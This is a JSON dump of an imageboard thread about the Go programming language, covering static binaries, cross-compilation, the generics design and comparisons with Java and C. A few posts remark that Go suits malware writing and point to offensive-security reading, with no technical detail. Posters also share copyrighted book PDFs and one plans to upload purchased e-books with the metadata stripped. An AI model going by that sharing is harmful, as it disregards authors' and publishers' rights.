codebase.","name":"push","time":1596577682,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596577682},{"no":19936,"resto":6019,"com":"<a onclick=\"highlightReply('19931', event);\" href=\"\/\u03bb\/res\/6019.html#19931\">&gt;&gt;19931<\/a><br\/><span class=\"quote\">&gt;outputs portable static binaries<\/span><br\/>now, this is very interesting. i'll take a look at it.","name":"Terzibashjian","time":1596581121,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596581121},{"no":19942,"resto":6019,"com":"<a onclick=\"highlightReply('19928', event);\" href=\"\/\u03bb\/res\/6019.html#19928\">&gt;&gt;19928<\/a><br\/>Go is not a low level language (beyond cgo, which is a different story). Go is a high level, language for cli applications (and microservices) that allows for rapid prototyping and a very fast  development cycle that other langauges (that you mentioned) do not have.<br\/><span class=\"quote\"><br\/>&gt; lua and functional langauges and not python<\/span><br\/>I mean you just have bad taste and \/ or don't understand the benefits of compile-time languages that can work cross-platform.","name":"Von Neumann","time":1596595666,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596595666},{"no":19958,"resto":6019,"com":"<a onclick=\"highlightReply('19936', event);\" href=\"\/\u03bb\/res\/6019.html#19936\">&gt;&gt;19936<\/a><br\/>I should have been more clear; I meant \"portable\" in the sense of \"easy to send to another machine running the same OS and architecture, no runtime on the destination machine required\". It's not portable in the sense of \"one binary, all OSs and architectures\". I apologize if I misled you on that.<br\/><br\/>But as it happens, Go also makes it dead simple to cross-compile for different architectures and OSs. So while you can't just ship one binary for everyone, you can easily build multiple binaries for multiple platforms from your dev machine.","name":"sizeof","time":1596627503,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596627503},{"no":19965,"resto":6019,"com":"<a onclick=\"highlightReply('19958', event);\" href=\"\/\u03bb\/res\/6019.html#19958\">&gt;&gt;19958<\/a><br\/>Ah, my first thought was that you meant \"one binary, all OSs given the same architecture,\" since binaries are inherently architecture-dependent.<br\/><br\/>I wonder how possible it would be to achieve that. Obviously you'd need runtime-resolved abstractions for certain things like filesystem interactions, but to what extent could you just ignore the OS itself?","name":"Drifter","time":1596639822,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596639822},{"no":19972,"resto":6019,"com":"<a onclick=\"highlightReply('19965', event);\" href=\"\/\u03bb\/res\/6019.html#19965\">&gt;&gt;19965<\/a><br\/>It's an interesting idea. Cross-architecture (but same-OS) binaries have been done before. During the PPC-to-Intel transition, Apple made it fairly easy to build OSX \"universal\" binaries, aka fat binaries. They worked on all their then-current architectures by basically compiling for all architectures and stuffing all compiled code into single huge binaries.<br\/><br\/>One of the really interesting things about the ELF executable format is that it's cross-platform itself. ( <a href=\"https:\/\/en.wikipedia.org\/wiki\/Executable_and_Linkable_Format#Applications\" rel=\"nofollow\" target=\"_blank\">https:\/\/en.wikipedia.org\/wiki\/Executable_and_Linkable_Format#Applications<\/a> ). If Apple and Microsoft were to adopt it, and if the FatELF fat-binary variant were to become standard, you might well be able to ship a genuinely portable binary.<br\/><br\/>Unfortunately that's a longshot. Language implementers making cross-compilation easy and reliable is probably the least-bad short-term path.","name":"Trinity","time":1596655201,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596655201},{"no":20069,"resto":6019,"com":"It appears the Go people are homing in on an implementation of polymorphism\/generics that they can be happy with.<br\/><br\/>Recently, Rob Pike asked Philip Wadler, type theorist involved in Haskell, for help smoothing things out. Unsurprisingly, the result feels a lot like Haskell; surprisingly, it doesn't feel out of place in Go.<br\/><br\/>Attached are two slides from Wadler's talk on Featherweight Go, a simplified (it has only structs and interfaces) dialect of Go his people used as basis for their implementation. I don't know about gophers, but lambdaheads will surely quickly realize what's going on in them. If function syntax looks odd, remember that Featherweight Go doesn't have functions - they're implemented in terms of structs and interfaces.<br\/><br\/>It's quite interesting to watch an academic having a field day with an 'industry' language's type system. And on the Go side, it's good to hear they're taking pains to get a major feature like this exactly right.<br\/><br\/>Source: <a href=\"https:\/\/lwn.net\/Articles\/824716\/\" rel=\"nofollow\" target=\"_blank\">https:\/\/lwn.net\/Articles\/824716\/<\/a><br\/>Wadler's talk: <a href=\"https:\/\/arxiv.org\/pdf\/2005.11710.pdf\" rel=\"nofollow\" target=\"_blank\">https:\/\/arxiv.org\/pdf\/2005.11710.pdf<\/a> , <a href=\"https:\/\/www.youtube.com\/watch?v=Dq0WFigax_c\" rel=\"nofollow\" target=\"_blank\">https:\/\/www.youtube.com\/watch?v=Dq0WFigax_c<\/a>","name":"Boole","time":1596823448,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596823448,"tn_h":200,"tn_w":178,"h":1440,"w":1280,"fsize":95981,"filename":"slides","ext":".jpg","tim":"1596823448016","md5":"HD4hafcCNl1bHR9xk0YO\/A=="},{"no":20093,"resto":6019,"com":"<a onclick=\"highlightReply('20069', event);\" href=\"\/\u03bb\/res\/6019.html#20069\">&gt;&gt;20069<\/a><br\/><span class=\"quote\">&gt;And on the Go side, it's good to hear they're taking pains to get a major feature like this exactly right.<\/span><br\/>That's always been Go's major strength. Features are slowly and carefully planned, and implemented in a way that's consistent with other features.","name":"Unknown","time":1596854417,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596854417},{"no":20094,"resto":6019,"com":"<a onclick=\"highlightReply('20069', event);\" href=\"\/\u03bb\/res\/6019.html#20069\">&gt;&gt;20069<\/a><br\/>Like every other implementation of generics it looks ugly and hard to follow. This is coming from someone who uses Go every day professionally.<br\/><br\/>People trying to add complex features to a simple language. It's like that Git issue that's been open forever about people trying to add soykaf like exceptions and async\/await to a language that doesn't need them.","name":"fsociety","time":1596854709,"sticky":0,"locked":0,"cyclical":"0","last_modified":1596854709},{"no":20295,"resto":6019,"com":"<a onclick=\"highlightReply('20094', event);\" href=\"\/\u03bb\/res\/6019.html#20094\">&gt;&gt;20094<\/a><br\/>When I was just starting programming and began with Go, I heard complaints about a lack of generics from much more experienced programmers and assumed they knew what they were talking about.<br\/><br\/>Now, I'm becoming increasingly convinced that those same people are just flat-out lazy and unwilling to learn a new approach, and want every language in the world to look and act exactly like C++.","name":"Nguoi La","time":1597547977,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597547977},{"no":20301,"resto":6019,"com":"<a onclick=\"highlightReply('20295', event);\" href=\"\/\u03bb\/res\/6019.html#20295\">&gt;&gt;20295<\/a><br\/><span class=\"quote\">&gt;a new approach<\/span><br\/>Type erasure is not new and is not an acceptable replacement for proper generics. Go's approach to runtime polymorphism is better than C++'s, but ultimately it's still just type erasure.<br\/><br\/>Personally I'm glad the folks at Google finally decided to do something about this (and do it better than Java did). Now if they could only figure out a way to make error handling a little less annoying (doesn't even have to be exceptions), and I might even use this language voluntarily.","name":"Yet Another Lainon","time":1597601619,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597601619},{"no":20308,"resto":6019,"com":"<a onclick=\"highlightReply('20301', event);\" href=\"\/\u03bb\/res\/6019.html#20301\">&gt;&gt;20301<\/a><br\/>And you've made my point for me.<br\/><br\/>Go's alleged problems with lacking generics and it's highly explicit and mandatory error handling *are not problems with Go itself*. They're only problems for people who flat-out refuse to unlearn behaviour patterns common to other languages, but not appropriate to Go.<br\/><br\/>If you're not being paid to write Go, you know where you can download C++. If you're being paid to write Go, *get over yourself*, stop whining, and earn your paycheque.","name":"Turing","time":1597620371,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597620371},{"no":20309,"resto":6019,"com":"<a onclick=\"highlightReply('20295', event);\" href=\"\/\u03bb\/res\/6019.html#20295\">&gt;&gt;20295<\/a><br\/><a onclick=\"highlightReply('20308', event);\" href=\"\/\u03bb\/res\/6019.html#20308\">&gt;&gt;20308<\/a><br\/>I find it amusing that you guys seem to think that C++ is the only alternative, and that the people who criticize Go have only C++ in mind. Intellectual laziness at its finest.<br\/><span class=\"quote\"><br\/>&gt;If you're being paid to write Go, *get over yourself*, stop whining, and earn your paycheque.<\/span><br\/>You mean I can't talk about Go's shortcomings if I use it professionally? That seems weird.","email":"sage","name":"Morpheus","time":1597622245,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597622245},{"no":20311,"resto":6019,"com":"<a onclick=\"highlightReply('20295', event);\" href=\"\/\u03bb\/res\/6019.html#20295\">&gt;&gt;20295<\/a><br\/>Those people are C# and Java developers that think that their version of OOP (\"design patterns\") is the only version of OOP. The problem is you can't criticize these people, because there's very vocal majority of bad programmers who think languages like Java and C# are actually good.<br\/><br\/>Go disproves this and turns OOP upside down.<br\/><br\/>In the past I have been derezzed from other sites for soykafting on Java programmers specifically. These people think everything needs to be some kind of abstract factory to be successful. It's crazy the amount of boilerplate and bloat that higher level OO languages have that go does not.<br\/><span class=\"quote\"><br\/>&gt; make error handling a little less annoying (doesn't even have to be exceptions),<\/span><br\/>As long as it's exceptions I'm good. C++, Java and even Python all fail because they try and solve everything with Exceptions. Same thing as my comment above. Go just does it better and I don't understand the argument for exceptions, You're just creating unneeded code bloat. 5 lines of code versus 3 for the regular error handling I do in go right now. I don't know if I'd ever use exceptions in go if they were a choice (much like I do not use them in python or C++).<br\/><span class=\"quote\"><br\/>&gt; Go's alleged problems with lacking generics and it's highly explicit and mandatory error handling *are not problems with Go itself*. They're only problems for people who flat-out refuse to unlearn behaviour patterns common to other languages, but not appropriate to Go.<\/span><br\/>\"Learning new things is scary\"<br\/><br\/>Now to not sound like a snob, what don't I like about Go? The lack of casting between objects between libraries is very annoying. If I have an object defined in library A and it's the same as an object defined in library B, I should just be able to do a cast instead of doing flimsy json marshalling. I haven't found a good solution to this in the 2 1\/2 years I've been doing Go full time. In C you just cast.","name":"Colmerauer","time":1597628174,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597628174},{"no":20312,"resto":6019,"com":"<a onclick=\"highlightReply('20311', event);\" href=\"\/\u03bb\/res\/6019.html#20311\">&gt;&gt;20311<\/a><br\/><span class=\"quote\">&gt;As long as it's NOT exceptions I'm good.<\/span><br\/>Damn proofreading.","name":"Mitnick","time":1597628492,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597628492},{"no":20324,"resto":6019,"com":"<a onclick=\"highlightReply('20308', event);\" href=\"\/\u03bb\/res\/6019.html#20308\">&gt;&gt;20308<\/a><br\/><span class=\"quote\">&gt;And you've made my point for me.<\/span><br\/>Let's be serious here; you could take any counterargument and frame it as \"making your point for you\".<br\/><span class=\"quote\">&gt;Go's alleged problems with lacking generics and it's highly explicit and mandatory error handling *are not problems with Go itself*.<\/span><br\/>This can be used to justify the lack of literally any feature in any language. A fine way to stop a language's evolution.<br\/><span class=\"quote\">&gt;They're only problems for people who flat-out refuse to unlearn behaviour patterns common to other languages, but not appropriate to Go.<\/span><br\/><span class=\"quote\">&gt;appropriate<\/span><br\/>Why would generics be \"not appropriate to Go\"? Why would at least some basic (yet still explicit) syntactic sugar around the tedious error handling of Go be \"not appropriate to Go\"? Do you despise abstraction and convenience? Is there something about Go itself that forbids abstraction and convenience?<br\/><span class=\"quote\">&gt;If you're not being paid to write Go, you know where you can download C++. If you're being paid to write Go, *get over yourself*, stop whining, and earn your paycheque.<\/span><br\/>That is a pretty sad approach to life. \"What? You would like if things were better?? Woah there son, get over yourself. Do like me and stop whining, earn your paycheque and keep eating soykaf by the spoonful.\"<br\/><br\/><a onclick=\"highlightReply('20311', event);\" href=\"\/\u03bb\/res\/6019.html#20311\">&gt;&gt;20311<\/a><br\/><span class=\"quote\">&gt;I should just be able to do a cast instead of doing flimsy json marshalling<\/span><br\/>How would that work? You say the objects are \"the same\", but what exactly do you mean by this? That the structs have the same layout? What if a new version of lib A changes the struct's layout? Or do you mean similar methods but different returned values? Different methods but similar returned values? <br\/><span class=\"quote\">&gt;In C you just cast.<\/span><br\/>lol","name":"Liet Kynes","time":1597721076,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597721076},{"no":20328,"resto":6019,"com":"<a onclick=\"highlightReply('20324', event);\" href=\"\/\u03bb\/res\/6019.html#20324\">&gt;&gt;20324<\/a><br\/><span class=\"quote\">&gt;That the structs have the same layout?<\/span><br\/>Not necessarily. For example, you could have an internal API with a specific structure, and an internal API with a slightly different structure. The easiest way to convert between the two in Go is to use json.Marshal \/ json.Unmarshal to go between the two, or they could be identical, both have similar outcomes.","name":"Otto Normalverbraucher","time":1597761175,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597761175},{"no":20342,"resto":6019,"com":"<a onclick=\"highlightReply('20311', event);\" href=\"\/\u03bb\/res\/6019.html#20311\">&gt;&gt;20311<\/a><br\/>Go doesn't prove or disprove anything. It is Java 1.5 but with different syntax and a different \"VM\".","email":"sage","name":"Switch","time":1597788201,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597788201},{"no":20343,"resto":6019,"com":"<span class=\"quote\">&gt;Now to not sound like a snob, what don't I like about Go? The lack of casting between objects between libraries is very annoying. If I have an object defined in library A and it's the same as an object defined in library B, I should just be able to do a cast instead of doing flimsy json marshalling. I haven't found a good solution to this in the 2 1\/2 years I've been doing Go full time. In C you just cast.<\/span><br\/><span class=\"quote\">&gt;I have been a gopher for 2.5 years and still think there is no casting.<\/span><br\/>The absolute state of Go.","email":"sage","name":"Frank Garza","time":1597788280,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597788280},{"no":20361,"resto":6019,"com":"<a onclick=\"highlightReply('20328', event);\" href=\"\/\u03bb\/res\/6019.html#20328\">&gt;&gt;20328<\/a><br\/><span class=\"quote\">&gt;use json.Marshal \/ json.Unmarshal to go between the two<\/span><br\/>Wouldn't json.Marshal+json.Unmarshal (without otherwise modifying fields) really only work if the marshalled structs have the same JSON structure (recursively)? Is that really so common for structs from separate libraries? Otherwise you're going to have to do some manual adjustments anyways, which kind of defeats the idea of an easy cast (i.e. you would need to define conversion functions anyways).","name":"Cutter","time":1597798609,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597798609},{"no":20364,"resto":6019,"com":"<a onclick=\"highlightReply('20342', event);\" href=\"\/\u03bb\/res\/6019.html#20342\">&gt;&gt;20342<\/a><br\/>Go has very little in common with Java outside of the aspects they both inherited from C.","name":"Cypher","time":1597804841,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597804841},{"no":20365,"resto":6019,"com":"<a onclick=\"highlightReply('20364', event);\" href=\"\/\u03bb\/res\/6019.html#20364\">&gt;&gt;20364<\/a><br\/>Both love boilerplate, however.","email":"sage","name":"The Oracle","time":1597815468,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597815468},{"no":20376,"resto":6019,"com":"<a onclick=\"highlightReply('20365', event);\" href=\"\/\u03bb\/res\/6019.html#20365\">&gt;&gt;20365<\/a><br\/>Of course.","name":"Pulse","time":1597884538,"sticky":0,"locked":0,"cyclical":"0","last_modified":1597884538},{"no":20393,"resto":6019,"com":"<a onclick=\"highlightReply('20364', event);\" href=\"\/\u03bb\/res\/6019.html#20364\">&gt;&gt;20364<\/a><br\/>That's because you're looking at it with a microscope. It's such a parody of Java 1.5 it's not even funny. They even have the same retard casting soykaf everywhere, and the same pointless \"base classes\" and insane \"design patterns\".","email":"sage","name":"drop","time":1598030938,"sticky":0,"locked":0,"cyclical":"0","last_modified":1598030938},{"no":20445,"resto":6019,"com":"<a onclick=\"highlightReply('20393', event);\" href=\"\/\u03bb\/res\/6019.html#20393\">&gt;&gt;20393<\/a><br\/>What the fuarrrk are you talking about? Go literally goes out of its way to not have a true object system, which is the definitive feature of Java.<br\/><br\/>There's definite overlap, don'tget me wrong, both are pretty derivative of C\/C++, and I wouldn't doubt that there <em>is<\/em> some Java influence in Go, but the key features and broad philosophy of the two are worlds apart.","name":"Ivan Horvat","time":1598300678,"sticky":0,"locked":0,"cyclical":"0","last_modified":1598300678},{"no":20457,"resto":6019,"com":"<a onclick=\"highlightReply('20393', event);\" href=\"\/\u03bb\/res\/6019.html#20393\">&gt;&gt;20393<\/a><br\/><span class=\"quote\">&gt; It's such a parody of Java 1.5 it's not even funny<\/span><br\/>Of course, I forgot that Go was an object-oriented programming language. And that one defines classes in Go and can create child classes and overload methods and so on.<br\/><br\/>Btw, Java 1.4 was the last Java version without Generics. Tho, Go has Generics now?<br\/><span class=\"quote\"><br\/>&gt; They even have the same retard casting soykaf everywhere<\/span><br\/>Well.. you have safe casts and a super type. This is not Java-like, but programming languages 101.<br\/><span class=\"quote\"><br\/>&gt; and the same pointless \"base classes\"<\/span><br\/>If your trying to compare Object with interface{}, good luck with that. Both could be seen as super types, but that's it. Like, really.","name":"Yamaoto Toshi","time":1598338323,"sticky":0,"locked":0,"cyclical":"0","last_modified":1598338323},{"no":20754,"resto":6019,"com":"<a onclick=\"highlightReply('6085', event);\" href=\"\/\u03bb\/res\/6019.html#6085\">&gt;&gt;6085<\/a><br\/>You can make some good malware with it too. C is much better for that though, IMO.","name":"Leto Atreides I","time":1599744926,"sticky":0,"locked":0,"cyclical":"0","last_modified":1599744926},{"no":20755,"resto":6019,"com":"<a onclick=\"highlightReply('20754', event);\" href=\"\/\u03bb\/res\/6019.html#20754\">&gt;&gt;20754<\/a><br\/>As a matter of fact, there is already alot of malware written in go.","name":"synchronized","time":1599745103,"sticky":0,"locked":0,"cyclical":"0","last_modified":1599745103},{"no":20945,"resto":6019,"com":"<a onclick=\"highlightReply('15544', event);\" href=\"\/\u03bb\/res\/6019.html#15544\">&gt;&gt;15544<\/a><br\/>Went back to this after a long time, had a version with WaitGroups but because I couldn't figure out the concurrency model that would match my need it ended up with the same performance as original (20s).<br\/>I dropped the concurrency thinking, and it turns out the algorithm was also soykaf, so now I've added length finding but mostly it uses dichotomy. Went from 20s to 3s even with the extra steps, so I'm pretty happy.<br\/>If someone can take the time to explain why I would benefit running some parts async or why not (I'm thinking since I only wait for one request to bring me the result I want I would need a way to drop the other requests?), that would be really helpful!","name":"Torvalds","time":1600728269,"sticky":0,"locked":0,"cyclical":"0","last_modified":1600728269},{"no":20946,"resto":6019,"com":"<a onclick=\"highlightReply('20755', event);\" href=\"\/\u03bb\/res\/6019.html#20755\">&gt;&gt;20755<\/a><br\/>Reminds me that some of you might be interested in Black Hat Go.","name":"sizeof","time":1600735226,"sticky":0,"locked":0,"cyclical":"0","last_modified":1600735226,"tn_h":200,"tn_w":200,"h":200,"w":200,"fsize":4660339,"filename":"Black Hat Go - Tom Steele","ext":".pdf","tim":"1600735226022","md5":"2Yre8hdKGmJEXKd\/1QA16g=="},{"no":21209,"resto":6019,"com":"<a onclick=\"highlightReply('20457', event);\" href=\"\/\u03bb\/res\/6019.html#20457\">&gt;&gt;20457<\/a><br\/>There's a proposal in place that looks pretty promising. Not sure if it's been accepted or not. <br\/><br\/><a onclick=\"highlightReply('20755', event);\" href=\"\/\u03bb\/res\/6019.html#20755\">&gt;&gt;20755<\/a><br\/>Allegedly go malware is harder to reverse engineer atm due to lack of tooling support for Go binaries. <br\/><br\/><a onclick=\"highlightReply('20393', event);\" href=\"\/\u03bb\/res\/6019.html#20393\">&gt;&gt;20393<\/a><br\/>Classes aren't really a thing due to inheritance not being a thing, so the idea of a base class doesn't really apply. If you want to think of the empty interface, it's much more akin to a void pointer than anything. In Java, taking in an Object doesn't handle primitives iirc.","name":"Cowboy","time":1602214944,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602214944},{"no":21219,"resto":6019,"com":"<a onclick=\"highlightReply('21209', event);\" href=\"\/\u03bb\/res\/6019.html#21209\">&gt;&gt;21209<\/a><br\/><span class=\"quote\">&gt;There's a proposal in place that looks pretty promising. Not sure if it's been accepted or not. <\/span><br\/>I was worried that the Go devs would bow to public pressure and simply import Java-style class insanity verbatim. But fortunately they insisted on taking their time and implementing a form of generics that's a good syntactic and functional fit to the language.<br\/><br\/>Not sure I'll actually use Go generics as I've never found the lack of them to be an issue, but if it shuts up the generics-obsessed crowd without also destroying the language, then I'll be OK with that situation.","name":"Nemissa","time":1602243141,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602243141},{"no":21224,"resto":6019,"com":"<a onclick=\"highlightReply('21219', event);\" href=\"\/\u03bb\/res\/6019.html#21219\">&gt;&gt;21219<\/a><br\/>Agreed, it's definitely not a perfect solution, and the team itself mentions that it shouldn't be used by most people, but I'm really glad they took the time to compare different forms of generics.<br\/><br\/>Allegedly Rob Pike met up with someone who did a lot of work on Haskell's type system for some inspiration. <br\/><br\/>I doubt I'll be using generics in most cases, but it'd be nice to have an interface{} free version of an LRU for example without needing to rely on code generation.","name":"Bob Arctor","time":1602256040,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602256040},{"no":21231,"resto":6019,"com":"What would be a good resource to learn the language ?<br\/>I'm not a complete beginner, but I'm closer to one than a practical and competent programmer.<br\/>(Never done anything really useful, nor really complex)","name":"Incognito","time":1602280112,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602280112},{"no":21235,"resto":6019,"com":"<a onclick=\"highlightReply('21231', event);\" href=\"\/\u03bb\/res\/6019.html#21231\">&gt;&gt;21231<\/a><br\/>Honestly, the \"Go Tour\" (<a href=\"https:\/\/tour.golang.org\/welcome\/1\" rel=\"nofollow\" target=\"_blank\">https:\/\/tour.golang.org\/welcome\/1<\/a>) is a very solid intro to Go. It's become almost a cliche at this point to recommend new people try it out, but it really is a great resource.<br\/><br\/>Go By Example (<a href=\"https:\/\/gobyexample.com\" rel=\"nofollow\" target=\"_blank\">https:\/\/gobyexample.com<\/a>) is also good. It eases you in to the language with very clear code examples.","name":"The Oracle","time":1602283954,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602283954},{"no":21255,"resto":6019,"com":"<a onclick=\"highlightReply('21224', event);\" href=\"\/\u03bb\/res\/6019.html#21224\">&gt;&gt;21224<\/a><br\/><span class=\"quote\">&gt;Allegedly Rob Pike met up with someone who did a lot of work on Haskell's type system for some inspiration. <\/span><br\/>That would make sense. He's always had a refreshing immunity to the whole not-invented-here syndrome that sometimes infects software project leads.","name":"Unnamed","time":1602350231,"sticky":0,"locked":0,"cyclical":"0","last_modified":1602350231},{"no":22183,"resto":6019,"com":"Anyone got some more books I can read offline to share? I already got this gem, but I'm looking to hoard everything I can.<br\/><br\/><a onclick=\"highlightReply('20946', event);\" href=\"\/\u03bb\/res\/6019.html#20946\">&gt;&gt;20946<\/a><br\/>That looks good. Thanks.","name":"Colmerauer","time":1605376247,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605376247,"tn_h":300,"tn_w":212,"h":300,"w":212,"fsize":3946770,"filename":"The Go Programming Language","ext":".pdf","tim":"1605376138814","md5":"m+UxZYGIlg9OlIMV8hbL9g=="},{"no":22184,"resto":6019,"com":"<a onclick=\"highlightReply('22183', event);\" href=\"\/\u03bb\/res\/6019.html#22183\">&gt;&gt;22183<\/a><br\/>I have a few decent ones that I bought on sale from packt, but I'm hesitant to upload them until I can find out if there's metadata in the files linked to my IRL identity. I'm going to do some digging today to see if I can safely upload metadata-free copies of the PDFs and epubs.","name":"Guthrie","time":1605378345,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605378345},{"no":22195,"resto":6019,"com":"Every time I go back to GO I am all like \"OK, but I can do the same in C and it works faster\". It barely makes any sense to use it unless you want to do quick concurrent and\/or parallel hacks and not free() soykaf manually. Creating dynamic arrays of arrays is still as tedious  as it was in C. It may be OKish for so called enterprise software houses as doing soykaf as quick as possible is profitable in such environments. But elsewhere else where speed and optimization counts in system programming - not so much IMHO.<br\/>It most probably will have strong representation in webdev tho. It east node.js,ruby and PHP for breakfast while babysitting code monkeys enough they cannot make too much damage when operating on strings and memory. But it may require creation of GO specific wide \"software patents\" palette - as we know webdev is mostly hordes of mediocre to bad programmers that need bondage and discipline while programing.","name":"typedef","time":1605404635,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605404635,"tn_h":200,"tn_w":200,"h":600,"w":600,"fsize":29387,"filename":"ur,socks_flatlay_medium,square,600x600-bg,f8f8f8.1","ext":".jpg","tim":"1605404634721-0","md5":"8qJbzn7Q3SkUXLeY9i+X7Q=="},{"no":22197,"resto":6019,"com":"<a onclick=\"highlightReply('22195', event);\" href=\"\/\u03bb\/res\/6019.html#22195\">&gt;&gt;22195<\/a><br\/><span class=\"quote\">&gt;Creating dynamic arrays of arrays is still as tedious  as it was in C<\/span><br\/>Oh, yeah. It's so tedious to type<br\/><br\/><pre style=\" display: inline!important;padding-top: 0px;padding-bottom: 0px;\"><code class=\"hljs go\" style=\"display: inline!important;padding-top: 0px;padding-bottom: 0px; \">s := <span class=\"hljs-built_in\">make<\/span>([]<span class=\"hljs-keyword\">string<\/span>, <span class=\"hljs-number\">0<\/span>) <\/code><\/pre><br\/>Daaaaamn, son! That took me a whole few seconds! Half the day gone, I swear. And before you say \"but that's a slice, not an array\", I'd just like to point out that almost nobody writing Go uses arrays directly. It's slice city.<br\/><span class=\"quote\"><br\/>&gt;But it may require creation of GO specific wide \"software patents\" palette<\/span><br\/>I literally have no idea what sort of point you're trying to make here. I've read that sentence a dozen times and it still confuses me.","name":"J.C. Denton","time":1605406457,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605406457},{"no":22198,"resto":6019,"com":"<a onclick=\"highlightReply('22197', event);\" href=\"\/\u03bb\/res\/6019.html#22197\">&gt;&gt;22197<\/a><br\/>Congratz son for not addressing what I wrote about.","name":"Shogun","time":1605407219,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605407219},{"no":22199,"resto":6019,"com":"<a onclick=\"highlightReply('22197', event);\" href=\"\/\u03bb\/res\/6019.html#22197\">&gt;&gt;22197<\/a><br\/><span class=\"quote\">&gt;I literally have no idea what sort of point you're trying to make here. I've read that sentence a dozen times and it still confuses me.<\/span><br\/><br\/>Go back after few years of hanging around real world programing teams. You are going to understand that sentence first time you read it.","name":"Nemissa","time":1605407334,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605407334},{"no":22205,"resto":6019,"com":"<a onclick=\"highlightReply('22198', event);\" href=\"\/\u03bb\/res\/6019.html#22198\">&gt;&gt;22198<\/a><br\/><a onclick=\"highlightReply('22199', event);\" href=\"\/\u03bb\/res\/6019.html#22199\">&gt;&gt;22199<\/a><br\/>Show us on the doll where Rob Pike hurt you.","name":"Moore","time":1605416575,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605416575},{"no":22210,"resto":6019,"com":"<a onclick=\"highlightReply('22205', event);\" href=\"\/\u03bb\/res\/6019.html#22205\">&gt;&gt;22205<\/a><br\/>Emilly, leave mommy's lab coat alone. It's time to go to sleep, not to play a doctor.","email":"sage","name":"renames","time":1605418729,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605418729},{"no":22250,"resto":6019,"com":"what's everyone using go for?","name":"Neuromancer","time":1605488224,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605488224},{"no":22251,"resto":6019,"com":"<a onclick=\"highlightReply('22250', event);\" href=\"\/\u03bb\/res\/6019.html#22250\">&gt;&gt;22250<\/a><br\/>I'm interested in this too, seems to me like it's just a fancier Python for extremely niche cases (like, Google scale) and hobby users.","name":"Six","time":1605489840,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605489840},{"no":22253,"resto":6019,"com":"<a onclick=\"highlightReply('22250', event);\" href=\"\/\u03bb\/res\/6019.html#22250\">&gt;&gt;22250<\/a><br\/>I've been using it for some privacy-centric self-hosted services intended to be used as Tor hidden services (but are fine on the open web too). The stock html templating system makes it ridiculously easy to avoid javascript completely and let the server do all the work. I won't do javascript on Tor.<br\/><br\/>Since it's a memory-safe language I don't need to worry about buffer overruns. Since it's statically-typed I don't need to worry about runtime errors due to mismatched types. And since it compiles to static binaries I don't have to worry about walking someone thought a crazy install process where they have to npm <em>this<\/em> thing or pip <em>that<\/em> thing or .<br\/><br\/>It's also a nice language for building crossplatform commandline tools. Dead simple to bang out a reliable little utility in an hour or so that'll work everywhere without having to worry about the destination machine having the full interpreter installed (like with Python).<br\/><br\/><a onclick=\"highlightReply('22251', event);\" href=\"\/\u03bb\/res\/6019.html#22251\">&gt;&gt;22251<\/a><br\/>Not really. Go is the result of the original C\/Unix folks (you don't get much more OG than Ken Thompson) looking back at 40+ years of C and 20+ years of C++, and deciding where they'd screwed up with C and where Stroustrup screwed up with C++. They set out to create a modern statically-typed C-alike with garbage collection, much cleaner syntax (Only 1 looping construct! Only 25 keywords!), modern native data types (Complex numbers!), concurrency built-in, and a massive standard library. And it compiles crazy-fast.<br\/><br\/>I really do recommend checking out the Go tour (<a href=\"https:\/\/tour.golang.org\/welcome\/1\" rel=\"nofollow\" target=\"_blank\">https:\/\/tour.golang.org\/welcome\/1<\/a>). It's a nice introduction to the language.<br\/><br\/>Yeah, I'm a fanboy. But it's a language that scratches a lot of my itches.","name":"Faye Valentine","time":1605491171,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605491171},{"no":22255,"resto":6019,"com":"<a onclick=\"highlightReply('22250', event);\" href=\"\/\u03bb\/res\/6019.html#22250\">&gt;&gt;22250<\/a><br\/>I need a job (can't find one for my field right now) and decide to go for webdev since that is the fastest way to get a programming job here. Since I don't like JS, the other two options for me were Rust and Go. Since a friend said Go had a higher chances of me getting a job(and have more libraries for webdev), I decided to learn Go.","name":"Boris Grishenko","time":1605491884,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605491884},{"no":22258,"resto":6019,"com":"<a onclick=\"highlightReply('20946', event);\" href=\"\/\u03bb\/res\/6019.html#20946\">&gt;&gt;20946<\/a><br\/>I appreciate this. I'm looking at the vx-underground repo right now.","name":"The Oracle","time":1605492640,"sticky":0,"locked":0,"cyclical":"0","last_modified":1605492640},{"no":22261,"resto":6019,"com":"<a onclick=\"highlightReply('22255', event);\" href=\"\/\u03bb\/res\/6019.html#22255\">&gt;&gt;22255<\/a><br\/>Oh boy, I sure hope you find a backend-only job, otherwise JS is pretty much mandatory for webdev, unless you go full .Net an use something like Blazor.<br\/><br\/>Rust web development for what I can tell runs wrapped in 